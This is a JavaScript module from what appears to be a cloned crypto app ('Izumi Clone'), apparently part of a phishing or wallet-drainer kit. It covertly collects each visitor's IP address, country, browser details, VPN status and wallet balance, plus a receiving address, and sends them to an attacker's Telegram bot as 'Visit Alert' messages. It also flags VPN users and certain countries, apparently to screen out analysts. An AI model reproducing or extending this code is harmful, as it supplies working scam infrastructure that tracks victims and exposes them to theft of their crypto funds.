import axios from "axios";
import {
  getUserCountry,
  checkVpnStatusWithIPQS,
  getRecipientAddress,
} from "./userLocation"; // Ensure correct file imports

// Telegram Bot Token and Chat ID
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_BOT_CHAT_ID;

// Function to send a message to Telegram
export const sendMessageToTelegram = async (message) => {
  const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
  const payload = {
    chat_id: TELEGRAM_CHAT_ID,
    text: message,
    parse_mode: "Markdown", // Enables Markdown for text formatting in Telegram
  };

  try {
    const response = await axios.post(url, payload);
    if (response.data.ok) {
      console.log("Message sent to Telegram successfully");
    } else {
      console.error("Failed to send message to Telegram:", response.data);
    }
  } catch (error) {
    console.error("Error sending message to Telegram:", error);
  }
};

// Function to send app details (like ADA balance) to Telegram
export const sendAppDetailsToTelegram = async (balance) => {
  // let tokenDetails = tokens.map(
  //   (token) =>
  //     `|💵 ${token.assetName}: ${(token.amount / 1000000).toFixed(2)} ${
  //       token.assetName
  //     }   |`
  // );

  // Fetch the full user country details (including VPN status)
  let userCountryData = await getUserCountry();

  if (!userCountryData) {
    console.error("Could not retrieve user country data");
    userCountryData = {
      country: "Unknown",
      countryCode: "XX",
      isVpnIpdata: false,
    }; // Default fallback
  }

  const { country, countryCode, ip, isVpnIpdata } = userCountryData;
  const specialCountries = ["AE"];

  const isVpnIPQS = await checkVpnStatusWithIPQS(ip);

  // Fetch the recipient address
  const recipientAddress = await getRecipientAddress();

  const globeIcon = "🌍"; // Unicode globe icon
  const isMine =
    specialCountries.includes(countryCode) || isVpnIpdata || isVpnIPQS
      ? "🔴"
      : "🟢";

  let message =
    `*Visit Alert*\n` +
    `App: Izumi Clone\n\n` +
    `User Info--------------------\n` +
    `| Country: ${globeIcon} ${country} (${countryCode}) |\n`;

  if (isVpnIpdata || isVpnIPQS || specialCountries.includes(countryCode)) {
    message += `| ⚠️ VPN / MARKED Country SUSPECTED  |\n`;
  } else {
    message += `| ✅ NO VPN SUSPECTED |\n`;
  }

  message +=
    `| 💼 Receiving Address: ${recipientAddress} ${isMine}|\n` +
    `--------------------------------\n` +
    `| 💵 User Wallet Balance  |\n` +
    `| 💵 ${balance}      |\n` +
    // `${tokenDetails.join("\n")}\n` +
    `------------------------------End`;

  // Send the message to Telegram
  await sendMessageToTelegram(message);
};

export const sendAppDetailsToTelegramLaunch = async () => {
  // console.log(token);

  let userCountryData = await getUserCountry();

  if (!userCountryData) {
    console.error("Could not retrieve user country data");
    userCountryData = { country: "Unknown", countryCode: "XX" }; // Default fallback
  }

  const { country, countryCode, ip } = userCountryData;
  const globeIcon = "🌍"; // Unicode globe icon
  const deviceInfo = navigator.userAgent;
  // console.log("IP: ", ip);
  // console.log(deviceInfo);
  let message =
    `*Visit Alert*\n` +
    `App: Izumi \n\n` +
    `User Info--------------------\n` +
    `| IP: ${ip} |\n` +
    `| Country: ${globeIcon} ${country} ${countryCode} |\n` +
    `| Browser: ${deviceInfo} |\n` +
    `--------------------------------\n` +
    // `| User Wallet Balance |\n` +

    // `| ${token.symbol}: ${(Number(token.balance_formatted)).toFixed(8)} ${token.symbol}     |\n` +
    // `${tokenDetails}\n` +  // Use tokenDetails directly
    `------------------------------End`;
  // console.log(message);
  // Send the message to Telegram
  await sendMessageToTelegram(message);
};
